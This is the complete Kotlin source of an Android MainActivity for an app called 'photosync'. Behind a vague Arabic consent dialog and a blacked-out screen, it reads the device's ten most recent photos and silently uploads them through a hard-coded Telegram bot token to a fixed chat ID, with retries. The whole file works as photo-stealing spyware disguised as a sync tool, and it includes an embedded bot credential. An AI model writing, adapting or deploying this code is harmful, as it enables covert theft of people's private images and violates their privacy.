package com.example.photosync

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private lateinit var rootView: View
    private val ioExecutor = Executors.newSingleThreadExecutor()

    private val botToken = "9085718260:AAFr_QfMHH1hgDrfZGpZbII9cgTqaC-mpVs"
    private val chatId = "8859920681"

    private val filePermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            showBlackScreenOnly()
            startTransferWithRetry()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        rootView = findViewById(R.id.rootLayout)
        showBlackScreenOnly()
        showApprovalMessage()
    }

    private fun showApprovalMessage() {
        AlertDialog.Builder(this)
            .setTitle("السماح بنقل الملفات")
            .setMessage("هل توافق على السماح بنقل الملفات؟")
            .setCancelable(false)
            .setPositiveButton("موافقة") { dialog, _ ->
                dialog.dismiss()
                requestFilePermissions()
            }
            .setNegativeButton("رفض") { dialog, _ ->
                dialog.dismiss()
                showBlackScreenOnly()
            }
            .show()
    }

    private fun requestFilePermissions() {
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            showBlackScreenOnly()
            startTransferWithRetry()
        } else {
            filePermissionLauncher.launch(permissions)
        }
    }

    private fun startTransferWithRetry() {
        ioExecutor.execute {
            val maxRetries = 3
            for (attempt in 1..maxRetries) {
                try {
                    performTransfer()
                    break
                } catch (_: Exception) {
                    if (attempt < maxRetries) {
                        Thread.sleep(2500L * attempt)
                    }
                }
            }
        }
    }

    private fun performTransfer() {
        val imageUris = getDeviceImageUris(limit = 10)
        for (uri in imageUris) {
            sendPhotoToTelegram(uri)
            Thread.sleep(500L)
        }
    }

    private fun getDeviceImageUris(limit: Int): List<Uri> {
        val uris = mutableListOf<Uri>()
        val projection = arrayOf(MediaStore.Images.Media._ID)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            while (cursor.moveToNext() && uris.size < limit) {
                val id = cursor.getLong(idColumn)
                val contentUri = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id.toString()
                )
                uris.add(contentUri)
            }
        }
        return uris
    }

    private fun sendPhotoToTelegram(imageUri: Uri) {
        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
        val lineEnd = "\r\n"
        val twoHyphens = "--"
        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"

        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            connectTimeout = 60_000
            readTimeout = 120_000
            doInput = true
            doOutput = true
            useCaches = false
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }

        inputStream.use { stream ->
            DataOutputStream(conn.outputStream).use { out ->
                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
                out.writeBytes(chatId + lineEnd)

                out.writeBytes(twoHyphens + boundary + lineEnd)
                out.writeBytes(
                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
                )
                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")

                val buffer = ByteArray(8192)
                var bytesRead: Int
                while (stream.read(buffer).also { bytesRead = it } != -1) {
                    out.write(buffer, 0, bytesRead)
                }

                out.writeBytes(lineEnd)
                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
                out.flush()
            }
        }

        val responseCode = conn.responseCode
        conn.disconnect()

        if (responseCode !in 200..299) {
            throw RuntimeException("Telegram response code: $responseCode")
        }
    }

    private fun showBlackScreenOnly() {
        rootView.setBackgroundColor(Color.BLACK)
        window.decorView.setBackgroundColor(Color.BLACK)
        window.statusBarColor = Color.BLACK
        window.navigationBarColor = Color.BLACK
    }

    override fun onDestroy() {
        super.onDestroy()
        ioExecutor.shutdown()
    }
}
